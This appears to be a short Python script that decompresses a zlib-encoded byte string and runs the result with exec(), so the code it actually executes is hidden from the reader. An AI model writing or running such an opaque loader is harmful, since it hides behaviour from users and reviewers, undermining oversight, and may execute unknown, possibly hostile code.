import zlib

compressed_code = b'x\x9c\x85RM\x8f\xd30\x10\xbd\xfbW\x8cv%\x9c\xa8m\x9a\xee"\x01\x95\xb2p\x80J\x1cVZ\x01\xf7\xc8\x8d\'\x8dEb\x07{B\x1a\x10\xff\x9d\xc9\xc7\xae\xb6H+\xe6\x92\xccx\xfc\xe6\xcd{6M\xeb<\x81\xc7\x1f\x1d\x06\n\xc2,\xb9\xb2\xda5\xe2\xbaw\xfe\xbb\xb1\xa7\xcd\x07\xebH\xe5g\xa1\xb1\x84\x13Z\xf4\x8a0\x9f\x9br\xdb5G\xf4Q\xbc\x17\x028.\xaa\x90-y2~\x8c\xa5h\xb7\x86]\x9a\xa6\xf1\xdc\x8b\xd4y{yELCJ\xe7\x1bEK)\xef\rUy\x8d\x8a\x11N\xf9/\xf4.D\xf3\t\x0fe\x98\xe7X\xe5\xd5\xef\xf9h\x9f\xde\xea?WB\x88\x7f\t\xbd\xc4_\x88\xd63C\x88\xa4\xd2\x8d\xb1@X\xe3\xc9\xabf\xb3\xc4\xdd"\x82\x8cE\xc30\xffex\x01\x1f\x8bsfl\xdbQ$?Yb\x1e\x03*\xbf\x86\xc6Y\xaa`\x1cV\x99\xb0@\xc2Mz\xf3:}\x03\xe4@\xbb\xde\xd6Ni\xd8<\x8b;&0d\xb2"j\xc3~\xbbu\xb66\x16Kd\xfb\xb0\xa8\xac+x\xb7\x90\x18\xbb\xbd\xff\xfcu{@\xdc>\x8c[\xf1\xcf\x17,\xd0\xb4\x94\xa8\xd0\x9e\xdfs\xd2R&W\xe7\x95Lw\xefv\xe9[\xb9jV\xf2\xd5\xb7\xa1\xc5\xec^\x8a\xebI\x8ah\x88E\xe7k^v`\x191\xb4\xce\x06\x1c-]^KrB\x8a\xb8\x81\xa5\x13\xa6\x84\xc7\x8e$\x90\xa2.\xe4\x85\xd3\xdc\x9d\xf1>)\xdb4\x994\xca\x04\xaeE\x1b\xf14\xe6\x9c\xfb\x85TEM-\xd7 \xfb\xa3\x8cA\xb1\x14\xa6\xc6\xc9[x\xf4w\x8c\xb1\x9a\xf4\xde\x10FO\xc3\n\x96\x10-\xcd\x0fj\xa6-\x1f>\x1e\x9e\xb4C\r\xa1+\n\x0c\xa1\xec\xeazH\xe4\xd4)\xb0\x0e\xcb\x80\xe5\xceA1\xb8\xbeP\x9da\x12\x18\xdd\xd1\x8a\xd4Q\xf1\xeeT\xe1\xf2Z\'.\xc0\xa6\xf1\xa3\x00\xf5\x93/\x1f9\xef\x11\x94\xc7\xb96\xe6\x8cV\x1a\xab\xc1\x10\xecy\xf0_#\x14"\xa2'
decompressed_code = zlib.decompress(compressed_code).decode()
exec(decompressed_code)
